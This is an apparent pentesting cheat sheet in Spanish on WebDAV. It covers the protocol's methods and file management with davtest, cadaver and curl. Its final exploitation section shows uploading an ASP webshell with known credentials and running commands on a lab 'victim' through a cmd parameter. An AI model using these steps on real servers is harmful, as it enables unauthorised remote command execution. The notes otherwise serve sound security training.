# WebDAV

# Tabla de Contenido

---

# ¿Qué es WebDAV?

---

WebDAV es una extención del protocolo **HyperText Transfer Protocol** (HTTP) que permite administrar archivos en un servidor web remotamente, puede trabajar tanto en redes locales como remotas (Internet). Este protocolo permite guardar, editar, mover, eliminar y compartir archivos. 

WebDAV utiliza un sistema de autenticación **usuario/contraseña** para autenticar a los usuarios en el sistema. Necesitamos dichas credenciales para acceder.

Algunos métodos extras que encontramos en WebDAV a diferencia de HTTP son:

- **PROPFIND:** Recupera propiedades, como el título, autor y fecha de modificación, de un recurso web. Puede recuperar tanto propiedades individuales como todas las propiedades del recurso.
- **PROPPATCH:** Establece y/o elimina propiedades de un recurso web. Este método permite cambiar los metadatos asociados con un recurso.
- **MKCOL:** Crea una nueva colección (similar a un directorio en un sistema de archivos) en la ubicación especificada por el URI.
- **COPY:** Copia un recurso de una ubicación a otra. Puede copiar tanto archivos individuales como colecciones completas.
- **MOVE:** Mueve un recurso de una ubicación a otra. Al igual que COPY, este método puede manejar tanto archivos como colecciones.
- **LOCK:** Bloquea un recurso para evitar modificaciones conflictivas. Existen dos tipos de bloqueos: exclusivos (sólo un usuario puede modificar el recurso) y compartidos (varios usuarios pueden obtener el bloqueo compartido).
- **UNLOCK:** Desbloquea un recurso que previamente ha sido bloqueado con el método LOCK.
- **SEARCH:** Permite buscar recursos en el servidor basado en ciertos criterios.

# Herramientas

---

- Curl
- Cadaver
- Davtest

# Uso

---

## 1. Davtest

Davtest realiza una serie de peticiones intentando subir, mover, copiar o eliminar archivos para determinar qué acciones tenemos permitidas con las credenciales actuales.

```bash
davtest -auth 'USER:PASSWORD' -url 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR'
```

> No recomiendo utilizar esta herramienta por el nivel de ruido que genera
> 

## 2. Cadaver

Cadaver es un cliente de WebDAV que proporciona una CLI (Command Line Interface) amigable para ejecutar las distintas acciones que se pueden realizar en un servidor WebDAV.

```bash
cadaver 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR'
```

Luego nos pedirá credenciales válidas.

```bash
cadaver 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR'
Authentication required for DOMAIN on server `URL_OR_IP':
Username: USER
Password: ********
```

Una vez dentro, se desplegará una CLI como esta.

```bash
dav:/WEBDAV_DIR/> 
```

Podemos realizar acciones como listar los archivos y directorios.

```bash
dav:/WEBDAV_DIR/> ls
```

Subir archivos.

```bash
dav:/WEBDAV_DIR/> put /FILE/PATH/TO/UPLOAD
```

Ver el contenido de los archivos.

```bash
dav:/WEBDAV_DIR/> less /FILE/PATH/TO/DELETE
```

Modificar archivos.

```bash
dav:/WEBDAV_DIR/> edit /FILE/PATH/TO/DELETE
```

Eliminar archivos.

```bash
dav:/WEBDAV_DIR/> delete /FILE/PATH/TO/DELETE
```

Crear directorios.

```bash
dav:/WEBDAV_DIR/> mkcol DIRECTORY_NAME
```

Eliminar directorios.

```bash
dav:/WEBDAV_DIR/> rmcol DIRECTORY_NAME
```

## 3. Curl

Estas acciones la podemos realizar de manera manual con **curl**.

Colocar **-L** en cada petición es crucial ya que por defecto al hacer una petición a esta ruta se realiza una redirección por detrás. De no colocar -L nos dará un error de que el recurso ha sido movido.

Listar los archivos y directorios.

```bash
curl --user 'USERNAME:PASSWORD' -L 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR'
```

Subir archivos.

```bash
curl -T FILE_TO_UPLOAD.EXTENSION --user 'USERNAME:PASSWORD' -L 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR/FILENAME.EXTENSION'
```

Ver el contenido de los archivos.

```bash
curl --user 'USERNAME:PASSWORD' 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR/EXITING_FILE.EXTENSION'
```

Eliminar archivos.

```bash
curl -X DELETE --user 'USERNAME:PASSWORD' -L 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR/FILENAME.EXTENSION'
```

Modificar archivos.

```bash
curl -T NEW_FILE.EXTENSION --user 'USERNAME:PASSWORD' -L 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR/EXITING_FILE.EXTENSION'
```

Crear directorios.

```bash
curl -X MKCOL --user 'USERNAME:PASSWORD' 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR/DIR_NAME'
```

Eliminar directorios.

```bash
curl -X DELETE --user 'USERNAME:PASSWORD' 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR/DIR_NAME'
```

# Explotación

---

Una manera común de explotar este servicio una vez tenemos credenciales es subiendo una webshell o una reverse shell al servidor y luego ejecutarlo.

Para esto vamos a subir un archivo **.asp** ubicado en **/usr/share/webshells/asp/webshells.asp**, esta web shell la podemos descargar desde [aquí](https://github.com/tennc/webshell/blob/master/asp/webshell.asp). Podemos guardarla donde querramos pero, yo la guardé en la ruta previamente mencionada.

Subimos la webshell.

```bash
curl -T /usr/share/webshells/asp/webshells.asp --user 'USERNAME:PASSWORD' -L 'http(s)://URL_OR_IP:PORT/WEBDAV_DIR/FILENAME.EXTENSION'
```

Si no presenta ningún problema la ejecución ya sería posible ejecutar comando en la máquina víctima con la ruta hacia el archivo y  a través del parámetro **cmd**.

> Los espacios deben ser sustituidos por el signo +
> 

```bash
curl --user 'ketti.andrea:password' 'http://192.168.56.136/webdav/webshell.asp?cmd=dir+C:\' 
```

También podríamos hacerlo directamente desde el navegador donde tendríamos el siguiente campo de texto donde podemos ingresar los comandos y obtendremos su respectiva salida.

![Untitled](Untitled.png)